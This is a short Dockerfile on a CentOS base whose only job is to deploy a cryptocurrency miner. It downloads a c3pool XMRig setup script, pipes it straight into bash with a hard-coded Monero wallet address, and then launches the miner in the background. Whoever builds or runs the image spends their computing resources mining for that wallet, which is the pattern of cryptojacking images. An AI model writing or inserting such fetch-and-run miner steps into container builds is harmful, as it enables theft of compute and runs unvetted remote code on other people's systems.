FROM docker.io/centos:latest

RUN curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 47xB5XcTvYSPpKPfehFyETDNqZMijJ6TrVCSqoT7z74fQUtphHaex44Z6GRNYbk4fN5kBAgN11kuJjeRpFez7e1sN6ZWqTa
RUN nohup sh  ./root/c3pool/miner.sh &